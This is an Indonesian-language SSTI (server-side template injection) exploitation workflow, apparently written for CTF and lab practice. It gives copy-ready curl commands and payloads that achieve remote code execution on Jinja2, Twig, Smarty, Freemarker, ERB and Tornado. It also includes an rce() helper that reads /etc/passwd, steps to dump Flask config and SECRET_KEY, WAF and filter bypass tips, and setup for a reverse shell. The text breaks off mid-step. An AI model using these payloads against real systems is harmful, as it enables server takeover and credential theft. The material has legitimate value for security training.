# Bagian 15 â€” Common Errors & Troubleshooting

|#|Error / Kondisi|Sebab|Solusi|
|--:|---|---|---|
|1|`{{7*7}}` tidak dievaluasi|Bukan SSTI atau engine berbeda|Coba `${7*7}`, `{7*7}`, `<%=7*7%>`|
|2|Payload muncul literal|Input dianggap data|Cek apakah input benar-benar masuk template|
|3|Hanya angka `49`|Engine belum teridentifikasi|Gunakan discriminator kedua|
|4|Jinja2 disangka Twig|Kedua engine dapat memakai `{{}}`|Test `{{7*'7'}}` dan stack trace|
|5|Twig disangka Jinja2|False positive dari `{{7*7}}`|Gunakan PHP/framework fingerprint|
|6|Payload diblokir WAF|Keyword/karakter masuk blacklist|Uji encoding/alternate syntax pada lab|
|7|`_` diblokir|Filter sederhana|Cari alternate attribute construction|
|8|`.` diblokir|Dot notation diblokir|Gunakan `attr()` bila tersedia|
|9|`[]` diblokir|Bracket filtering|Cari item-access alternative|
|10|`class` diblokir|Keyword blacklist|String concatenation/context variable|
|11|RCE payload gagal|Primitive tidak tersedia|Kembali ke enumeration object/context|
|12|`subclasses()` menghasilkan output panjang|Normal pada Python|Cari class relevan, jangan menghafal index|
|13|Index `Popen` berbeda|Environment berbeda|Enumerasi index pada target|
|14|Jinja2 `config` undefined|Context tidak menyediakan Flask config|Enumerasi object lain|
|15|Jinja2 `request` undefined|Tidak berada pada Flask request context|Cek application/framework|
|16|`system("id")` menghasilkan `true`|`system()` hanya return status|Gunakan command substitution/backticks jika sesuai|
|17|RCE bekerja tetapi output kosong|stdout tidak masuk response|Uji `pwd`, redirection hanya pada lab, atau OOB|
|18|Blind SSTI|Output tidak direfleksikan|Gunakan boolean/timing/OOB|
|19|Freemarker `?new` gagal|Security policy|Cek data model/object yang sudah tersedia|
|20|Twig `registerUndefinedFilterCallback` gagal|Twig version/config modern|Fingerprint version dan cari primitive lain|
|21|Smarty `{system("id")}` gagal|Security policy/function unavailable|Enumerasi capabilities|
|22|Handlebars constructor ditolak|Prototype access restrictions|Engine kemungkinan hardened|
|23|ERB menghasilkan `true`|`system()` return status|Gunakan backticks untuk stdout|
|24|Tornado `os.system()` hanya menghasilkan `0`|Output bukan bagian return value|Bedakan command execution dari visible stdout|
|25|Payload bekerja di browser tapi tidak curl|Encoding/request mismatch|Gunakan `--data-urlencode`|
|26|Payload bekerja di curl tapi tidak Burp|Burp mengubah encoding|Bandingkan raw request|
|27|SSTI hanya bekerja pada satu parameter|Context spesifik|Trace server-side parameter usage|
|28|Sandbox escape diperlukan|Engine memang terisolasi|Enumerasi sandbox boundaries terlebih dahulu|
|29|Payload berbeda antar target|Version/config berbeda|Jangan bergantung pada copy-paste payload|
|30|Script detection menghasilkan false positive|Detection heuristics sederhana|Konfirmasi manual dengan discriminator + errors|

---

# SSTI Troubleshooting Flow

```text
Payload gagal
    |
    v
Apakah payload sampai ke server?
    |
   YES
    |
    v
Apakah response berubah?
    |
    +---- NO
    |      |
    |      v
    |   Bukan syntax ini
    |      |
    |      v
    |   Test engine lain
    |
    +---- YES
           |
           v
    Apakah expression dievaluasi?
           |
      +----+----+
      |         |
     YES        NO
      |         |
      v         v
  fingerprint  reflection
      |         |
      v         v
 identify     bukan SSTI
 engine
      |
      v
 RCE gagal?
      |
      v
 Enumerate context
      |
      v
 Identify restriction
      |
      +---- blacklist
      |
      +---- sandbox
      |
      +---- function missing
      |
      +---- output blind
      |
      v
 Select next primitive
```

---

# SSTI Workflow â€” From Zero to RCE

```text
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. FIND INPUT                 â”‚
â”‚ GET / POST / Header / Upload  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚
                v
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 2. REFLECTION TEST             â”‚
â”‚ normal text â†’ response         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚
                v
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 3. UNIVERSAL DETECTION         â”‚
â”‚ {{7*7}} / ${7*7} / {7*7}      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚
                v
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 4. IDENTIFY ENGINE             â”‚
â”‚ discriminator + errors         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚
                v
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 5. ENUMERATE CONTEXT           â”‚
â”‚ config / request / data_model  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚
                v
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 6. DETERMINE RESTRICTIONS      â”‚
â”‚ blacklist / sandbox / context  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚
                v
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 7. SELECT EXECUTION PRIMITIVE  â”‚
â”‚ class / helper / runtime / os  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚
                v
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 8. VALIDATE RCE                â”‚
â”‚ id â†’ whoami â†’ pwd              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚
                v
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 9. DOCUMENT                    â”‚
â”‚ engine + payload + impact      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

# Muscle Memory â€” 60 Second SSTI Routine

Saat menemukan input mencurigakan:

```text
1. hello
2. {{7*7}}
3. ${7*7}
4. {7*7}
5. <%=7*7%>
6. #set($x=7*7)$x
```

Jika:

```text
{{7*7}} â†’ 49
```

lanjut:

```text
{{7*'7'}}
```

Jika:

```text
7777777
```

prioritas:

```text
Jinja2
```

Kemudian:

```text
{{config}}
{{request}}
{{self.__dict__}}
```

Jika perlu RCE:

```text
object
 â†“
class
 â†“
mro / bases
 â†“
object
 â†“
subclasses
 â†“
interesting class
 â†“
id
```

---

# Jinja2 Muscle Memory

```text
{{7*7}}
      â†“
49
      â†“
{{7*'7'}}
      â†“
7777777
      â†“
{{config}}
      â†“
{{request}}
      â†“
{{''.__class__}}
      â†“
{{''.__class__.__mro__}}
      â†“
{{''.__class__.__mro__[1].__subclasses__()}}
      â†“
find interesting class
      â†“
id
      â†“
whoami
      â†“
pwd
```

---

# Prinsip Penting

## 1. `{{7*7}} = 49` Bukan Bukti Jinja2

Ini hanya membuktikan:

```text
syntax {{ }}
+
arithmetic evaluation
```

---

## 2. `{{7*'7'}} = 7777777` Sangat Berguna

Karena:

```text
Jinja2/Python semantics
```

memberikan:

```text
"7" repeated 7 times
```

Ini jauh lebih diagnostik daripada:

```text
7*7
```

---

## 3. RCE Payload Tidak Universal

Payload bergantung:

```text
Engine
Version
Framework
Context
Sandbox
Security configuration
Available classes
Available globals
```

---

## 4. Error Adalah Informasi

Jangan menganggap:

```text
500 Internal Server Error
```

sebagai kegagalan.

Pertanyaan yang benar:

```text
Apa yang menyebabkan 500?
```

Cari:

```text
Class name
Package
Template path
Function name
Framework
Line number
```

---

## 5. PortSwigger/HTB/THM Mindset

Jangan:

```text
find SSTI
â†“
paste RCE payload
```

Gunakan:

```text
find input
â†“
prove evaluation
â†“
identify engine
â†“
map context
â†“
identify restrictions
â†“
choose primitive
â†“
prove RCE
```

---

# Final SSTI Checklist

```text
[ ] Input ditemukan
[ ] Reflection dikonfirmasi
[ ] {{7*7}} tested
[ ] ${7*7} tested
[ ] {7*7} tested
[ ] <%=7*7%> tested
[ ] Velocity syntax tested
[ ] Error/stack trace diperiksa
[ ] Engine fingerprint dikonfirmasi
[ ] Context objects diperiksa
[ ] Configuration diperiksa
[ ] Sandbox/blacklist diperiksa
[ ] RCE primitive dipilih
[ ] RCE divalidasi dengan id/whoami
[ ] Output behavior dipahami
[ ] Blind execution dipertimbangkan
[ ] Filter bypass diuji bila diperlukan
[ ] Payload dicatat
[ ] Engine/version dicatat
[ ] Impact dicatat
```

---

# Quick Command Reference

## Detection

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q={{7*7}}'
```

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode "q={{7*'7'}}"
```

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q=${7*7}'
```

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q={7*7}'
```

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q=<%=7*7%>'
```

---

## Jinja2 Information Disclosure

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q={{config}}'
```

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q={{request}}'
```

---

## Jinja2 Enumeration

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode "q={{''.__class__.__mro__}}"
```

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode "q={{''.__class__.__bases__}}"
```

---

## Jinja2 RCE Validation

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}"
```

---

## Twig Classic Lab Payload

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
```

---

## Smarty

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q={system("id")}'
```

---

## Freemarker

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q=${7*7}'
```

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
```

---

## ERB

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q=<%= 7*7 %>'
```

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q=<%= `id` %>'
```

---

## Tornado

```bash
curl -sG 'http://TARGET/search' \
  --data-urlencode 'q={% import os %}{{ os.system("id") }}'
```

---

# Golden Rule

```text
                 SSTI
                  |
                  v
          "Apakah server
          mengevaluasi saya?"
                  |
                  v
             IDENTIFY
                  |
                  v
          "Engine apa ini?"
                  |
                  v
           ENUMERATE
                  |
                  v
        "Apa yang tersedia?"
                  |
                  v
           RESTRICTION
                  |
                  v
       "Apa yang diblokir?"
                  |
                  v
            PRIMITIVE
                  |
                  v
        "Bagaimana mencapai
          code execution?"
                  |
                  v
              VALIDATE
                  |
                  v
             document
```

SSTI bukan sekadar:

```text
{{7*7}}
```

SSTI adalah proses:

```text
INPUT
 â†’ TEMPLATE EVALUATION
 â†’ ENGINE IDENTIFICATION
 â†’ CONTEXT ENUMERATION
 â†’ PRIMITIVE DISCOVERY
 â†’ EXECUTION
```

---

# [Workflow 23 â€” Server-Side Template Injection (SSTI)](/docs/ssti) — Complete Interactive Decision Workflow

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"
export URL="http://$TARGET"
mkdir -p ~/ssti_loot/{payloads,output,shells}
cd ~/ssti_loot

echo "[*] Target: $TARGET | LHOST: $LHOST"

# Pasang tools yang dibutuhkan
# tplmap
git clone https://github.com/epinna/tplmap.git ~/tools/tplmap 2>/dev/null || echo "[*] tplmap sudah ada"

# SSTImap
git clone https://github.com/vladko312/SSTImap.git ~/tools/sstimap 2>/dev/null || echo "[*] SSTImap sudah ada"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════════

## FASE 0: RECONNAISSANCE — TEMUKAN INPUT POINT

## ═══════════════════════════════════════════

> **Tujuan:** Sebelum test SSTI, kita harus tahu DI MANA input dimasukkan dan apakah server merefleksikannya.

### Langkah 0.1 — Identifikasi Entry Point

Bash

```
# Command 1: Cek teknologi yang digunakan (petunjuk awal engine)
curl -sI $URL | grep -iE "(server|x-powered-by|set-cookie|content-type)"

# Command 2: Whatweb fingerprint
whatweb $URL 2>/dev/null

# Command 3: Cek headers secara lengkap
curl -sv $URL 2>&1 | grep -iE "^< (server|x-powered-by|content-type|via)"
```

**OUTPUT BERHASIL ✅ — Petunjuk teknologi:**

text

```
< Server: Werkzeug/2.1.2 Python/3.10.4    → Flask/Jinja2
< Server: Apache/2.4.41 (Ubuntu)           → Mungkin PHP (Twig/Smarty)
< X-Powered-By: Express                    → Node.js (Handlebars)
< Set-Cookie: JSESSIONID=...               → Java (Freemarker/Velocity)
< X-Powered-By: PHP/8.1.0                  → PHP (Twig/Smarty)
```

**Tabel Petunjuk Teknologi → Engine:**

|Server Header|Kemungkinan Engine|Priority|
|---|---|---|
|`Werkzeug` / `Flask`|Jinja2|⭐⭐⭐|
|`PHP`|Twig atau Smarty|⭐⭐⭐|
|`Express` / `Node.js`|Handlebars / Nunjucks|⭐⭐|
|`Tomcat` / `JSESSIONID`|Freemarker / Velocity|⭐⭐⭐|
|`Ruby` / `Rails`|ERB|⭐⭐⭐|
|`Tornado`|Tornado (Python)|⭐⭐|

**OUTPUT GAGAL ❌ — Tidak ada petunjuk di header:**

text

```
< Server: nginx/1.18.0
```

➡️ Server disembunyikan. Lanjut ke Langkah 0.2, kita akan deteksi dari behavior.

---

### Langkah 0.2 — Temukan Parameter yang Direfleksikan

Bash

```
# Command 1: Test parameter GET biasa
curl -sG "$URL/search" --data-urlencode 'q=TESTSTRING123' | grep -i "TESTSTRING123"

# Command 2: Test berbagai endpoint umum
for endpoint in search query name message template; do
    result=$(curl -sG "$URL/$endpoint" --data-urlencode "${endpoint}=TESTSTRING123" 2>/dev/null | grep -c "TESTSTRING123")
    echo "[*] Endpoint /$endpoint: $result match"
done

# Command 3: Test POST body
curl -s -X POST "$URL/search" \
    --data-urlencode 'q=TESTSTRING123' | grep -i "TESTSTRING123"

# Command 4: Test headers yang sering direfleksikan
curl -s "$URL/" -H "User-Agent: TESTSTRING123" | grep "TESTSTRING123"
curl -s "$URL/" -H "X-Forwarded-For: TESTSTRING123" | grep "TESTSTRING123"
curl -s "$URL/" -H "Referer: TESTSTRING123" | grep "TESTSTRING123"
```

**OUTPUT BERHASIL ✅ — Input direfleksikan:**

HTML

```
<p>Search result for: TESTSTRING123</p>
```

➡️ **Simpan endpoint ini!**

Bash

```
export INJECT_URL="$URL/search"
export INJECT_PARAM="q"
export INJECT_METHOD="GET"
echo "[*] Injection point: $INJECT_METHOD $INJECT_URL param=$INJECT_PARAM"
```

➡️ Lanjut ke **FASE 1.**

**OUTPUT GAGAL ❌ — Input tidak muncul di response:**

text

```
(tidak ada TESTSTRING123 di output)
```

➡️ Input mungkin diproses di backend tanpa ditampilkan. Ini bisa **Blind SSTI**.  
➡️ Coba:

Bash

```
# Test apakah ada perubahan behavior
# Baseline response length
BASE_LEN=$(curl -sG "$URL/search" --data-urlencode 'q=hello' | wc -c)
echo "Baseline: $BASE_LEN bytes"

# Test dengan expression
TEST_LEN=$(curl -sG "$URL/search" --data-urlencode 'q={{7*7}}' | wc -c)
echo "With expression: $TEST_LEN bytes"

# Jika length berbeda → kemungkinan blind SSTI
```

---

## ═══════════════════════════════════════════

## FASE 1: DETECTION — APAKAH INI SSTI?

## ═══════════════════════════════════════════

> **Tujuan:** Konfirmasi bahwa server MENGEVALUASI expression kita, bukan hanya merefleksikan string.

### Langkah 1.1 — Universal Detection (Jalankan Semua)

Bash

```
# Helper function untuk testing
ssti_test() {
    local payload="$1"
    local desc="$2"
    echo -n "[-] Testing $desc: "
    curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=${payload}" 2>/dev/null \
        | grep -oP '\d+' | head -1
}

# Command 1: Jinja2/Twig/Tornado syntax
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{7*7}}"

# Command 2: Freemarker/EL syntax  
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=\${7*7}"

# Command 3: Smarty syntax
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={7*7}"

# Command 4: ERB syntax
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=<%= 7*7 %>"

# Command 5: Velocity syntax
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=#set(\$x=7*7)\$x"
```

**Cara Baca Output — Tabel Response:**

|Payload yang Dikirim|Response|Interpretasi|
|---|---|---|
|`{{7*7}}`|`49`|✅ Engine `{{}}` aktif!|
|`{{7*7}}`|`{{7*7}}` (literal)|❌ Tidak dievaluasi|
|`${7*7}`|`49`|✅ Engine `${}` aktif!|
|`{7*7}`|`49`|✅ Smarty kandidat|
|`<%= 7*7 %>`|`49`|✅ ERB (Ruby)|
|`#set($x=7*7)$x`|`49`|✅ Velocity|
|Apapun|Error 500|✅ Engine ada, perlu investigate error|

**OUTPUT BERHASIL ✅ — `{{7*7}}` menghasilkan `49`:**

HTML

```
<p>Search result for: 49</p>
```

➡️ **SSTI TERKONFIRMASI!** Engine menggunakan syntax `{{ }}`.  
➡️ Lanjut ke **Langkah 1.2** untuk identifikasi engine spesifik.

**OUTPUT GAGAL ❌ — Semua payload literal (tidak dievaluasi):**

HTML

```
<p>Search result for: {{7*7}}</p>
```

➡️ Beberapa kemungkinan:

1. Input di-escape sebelum masuk template
2. WAF memblokir
3. Bukan SSTI → cek vulnerability lain (XSS, SQLi, dll)

Bash

```
# Coba dengan URL encoding manual
curl -s "$INJECT_URL?${INJECT_PARAM}=%7B%7B7*7%7D%7D"

# Coba dengan double encoding
curl -s "$INJECT_URL?${INJECT_PARAM}=%257B%257B7*7%257D%257D"

# Coba POST sebagai alternatif
curl -s -X POST "$INJECT_URL" -d "${INJECT_PARAM}={{7*7}}"
```

**OUTPUT ERROR ❌ — Server Error 500:**

text

```
Internal Server Error
```

➡️ **INI BAGUS!** Error bisa berarti engine mengevaluasi tapi ada syntax error.  
➡️ Cek error message untuk fingerprint engine:

Bash

```
curl -s "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{" 2>&1 | grep -iE "(jinja|twig|smarty|freemarker|velocity|erb|tornado|template)"
```

---

### Langkah 1.2 — Engine Identification (Discriminator Test)

> Setelah `{{7*7}}` → `49`, kita perlu identifikasi SPESIFIK enginenya.

Bash

```
# THE DISCRIMINATOR: Test kunci untuk bedakan Jinja2 vs Twig
# Command 1: String multiplication test
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{7*'7'}}"
```

**OUTPUT BERHASIL ✅ — `7777777` (tujuh kali angka 7):**

HTML

```
<p>Search result for: 7777777</p>
```

➡️ **INI JINJA2!** Python melakukan string * int = string repetition.  
➡️ Catat: `export ENGINE="jinja2"`  
➡️ Lanjut ke **FASE 2A — Jinja2 Workflow.**

**OUTPUT BERHASIL ✅ — `49` (tetap 49):**

HTML

```
<p>Search result for: 49</p>
```

➡️ Kemungkinan **TWIG** (PHP). Lakukan konfirmasi:

Bash

```
# Konfirmasi Twig dengan cek error message
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{_self}}" | grep -i "twig"

# Atau cek dengan syntax Twig spesifik
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{app}}"
```

➡️ Catat: `export ENGINE="twig"`  
➡️ Lanjut ke **FASE 2B — Twig Workflow.**

**OUTPUT GAGAL ❌ — Error atau literal:**

text

```
TemplateSyntaxError / literal output
```

➡️ Baca error message dengan teliti:

Bash

```
# Ambil error message lengkap
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{7*'7'}}" 2>&1 | \
    grep -iE "(jinja|twig|smarty|freemarker|velocity|erb|tornado|werkzeug|flask)"
```

**Tabel Error → Engine:**

|Error String|Engine|
|---|---|
|`jinja2.exceptions`|Jinja2|
|`Twig\Error`|Twig|
|`SmartyException`|Smarty|
|`freemarker.core`|Freemarker|
|`org.apache.velocity`|Velocity|
|`ActionView` / `ERB`|Ruby ERB|
|`tornado.template`|Tornado|

---

### Langkah 1.3 — Auto Detection dengan Tools

Bash

```
# Method 1: tplmap
cd ~/tools/tplmap
python3 tplmap.py -u "${INJECT_URL}?${INJECT_PARAM}=*" 2>/dev/null | \
    grep -iE "(engine|detected|vulnerable|jinja|twig|smarty|freemarker)"

# Method 2: SSTImap
cd ~/tools/sstimap
python3 sstimap.py -u "${INJECT_URL}?${INJECT_PARAM}=*" 2>/dev/null | \
    grep -iE "(engine|detected|vulnerable)"

# Method 3: Script detect manual (cepat)
for payload in "{{7*7}}" "\${7*7}" "{7*7}" "<%= 7*7 %>" "#set(\$x=7*7)\$x"; do
    result=$(curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=${payload}" 2>/dev/null)
    if echo "$result" | grep -q "49"; then
        echo "[+] SSTI detected with payload: $payload"
    fi
done
```

**OUTPUT BERHASIL ✅ — tplmap/SSTImap mendeteksi:**

text

```
[+] Jinja2 plugin is testing rendering with tag '*'
[+] Jinja2 is vulnerable
```

➡️ Konfirmasi engine terdeteksi. Lanjut ke fase yang sesuai.

**OUTPUT GAGAL ❌ — Tools tidak mendeteksi:**

text

```
[*] Tested 6 rendering engines. No injection detected.
```

➡️ Coba dengan konfigurasi manual:

Bash

```
# Coba dengan header injection
python3 ~/tools/tplmap/tplmap.py \
    -u "$INJECT_URL" \
    -H "User-Agent: *"

# Coba POST
python3 ~/tools/tplmap/tplmap.py \
    -u "$INJECT_URL" \
    -d "${INJECT_PARAM}=*"
```

---

## ═══════════════════════════════════════════

## FASE 2A: JINJA2 WORKFLOW (Python/Flask)

## ═══════════════════════════════════════════

> **Masuk sini jika:** `{{7*7}}` → `49` DAN `{{7*'7'}}` → `7777777`

### Langkah 2A.1 — Information Disclosure (SELALU LAKUKAN INI DULU)

Bash

```
# Command 1: Dump Flask config (JACKPOT jika ada SECRET_KEY)
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{config}}"

# Command 2: Config items lebih detail
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{config.items()}}"

# Command 3: Request object
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{request}}"

# Command 4: Session object
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{session}}"

# Command 5: Environment variables via config
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{config.__class__.__init__.__globals__}}"
```

**OUTPUT BERHASIL ✅ — Config exposed:**

Python

```
<Config {
    'DEBUG': False,
    'SECRET_KEY': 'sup3r_s3cr3t_k3y_here',
    'DATABASE_URL': 'postgresql://admin:P@ss@localhost/db',
    'SESSION_COOKIE_NAME': 'session'
}>
```

➡️ **SIMPAN SEMUA INFO INI:**

Bash

```
# Simpan ke file
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{config.items()}}" \
    > ~/ssti_loot/output/config_dump.txt
cat ~/ssti_loot/output/config_dump.txt

# Extract SECRET_KEY jika ada
SECRET_KEY=$(grep -oP "SECRET_KEY.*?'([^']+)'" ~/ssti_loot/output/config_dump.txt | head -1)
echo "[!] SECRET_KEY: $SECRET_KEY"
```

➡️ Jika ada `SECRET_KEY` → bisa forge Flask session cookie (lihat `<a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>`)

**OUTPUT GAGAL ❌ — `config` undefined:**

text

```
Undefined
```

➡️ Tidak dalam Flask context atau config diblokir. Coba:

Bash

```
# Alternatif 1: Cek global variables
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{self.__dict__}}"

# Alternatif 2: Cek URL for
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{url_for.__globals__}}"
```

---

### Langkah 2A.2 — Jinja2 RCE via Built-in Globals (COBA INI PERTAMA!)

> **Kenapa ini dulu?** Tidak perlu cari index subclasses yang beda-beda per environment.

Bash

```
# Method 1: Via cycler (PALING RELIABLE di CTF)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('id').read() }}"

# Method 2: Via joiner
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ joiner.__init__.__globals__.os.popen('id').read() }}"

# Method 3: Via namespace
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ namespace.__init__.__globals__.os.popen('id').read() }}"

# Method 4: Via lipsum (Flask global)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ lipsum.__globals__.os.popen('id').read() }}"
```

**OUTPUT BERHASIL ✅ — RCE via cycler:**

HTML

```
<p>Search result for: uid=33(www-data) gid=33(www-data) groups=33(www-data)
</p>
```

➡️ **RCE CONFIRMED!**

Bash

```
# Set alias untuk RCE yang lebih mudah
rce() {
    curl -sG "$INJECT_URL" \
        --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('$1').read() }}" \
        | grep -oP '(?<=for: ).*'
}

# Recon dasar
rce "whoami"
rce "id"
rce "hostname"
rce "cat /etc/passwd"
rce "ls -la /home"
rce "cat /proc/1/cmdline | tr '\0' ' '"
```

➡️ Setelah recon, lanjut ke **Langkah 2A.5 — Reverse Shell**

**OUTPUT GAGAL ❌ — `cycler` tidak tersedia / undefined:**

text

```
UndefinedError: 'cycler' is undefined
```

➡️ Tidak dalam Flask context, coba method lain:

Bash

```
# Coba via request object
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{request.__class__.__mro__[1].__subclasses__()}}"
```

➡️ Lanjut ke **Langkah 2A.3** (subclasses chain).

---

### Langkah 2A.3 — Jinja2 RCE via Subclasses Chain (Fallback)

Bash

```
# Step 1: Lihat MRO (Method Resolution Order)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{''.__class__.__mro__}}"
```

**OUTPUT BERHASIL ✅:**

text

```
(<class 'str'>, <class 'object'>)
```

Bash

```
# Step 2: List semua subclasses dari object
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{''.__class__.__mro__[1].__subclasses__()}}" \
    > ~/ssti_loot/output/subclasses.txt

# Step 3: Cari class yang berguna (subprocess.Popen)
grep -oP "class '[\w.]+'" ~/ssti_loot/output/subclasses.txt | \
    grep -n "subprocess\|Popen\|os\._\|warnings\|catch_warn" | head -20
```

**OUTPUT BERHASIL ✅ — Menemukan Popen:**

text

```
217: class 'subprocess.Popen'
```

Bash

```
# Step 4: Catat index dan gunakan
export POPEN_INDEX=217

curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{''.__class__.__mro__[1].__subclasses__()[$POPEN_INDEX]('id',shell=True,stdout=-1).communicate()[0]}}"
```

**OUTPUT BERHASIL ✅:**

text

```
b'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
```

**OUTPUT GAGAL ❌ — Index salah / error:**

text

```
IndexError: list index out of range
```

➡️ Index berbeda. Cari lagi:

Bash

```
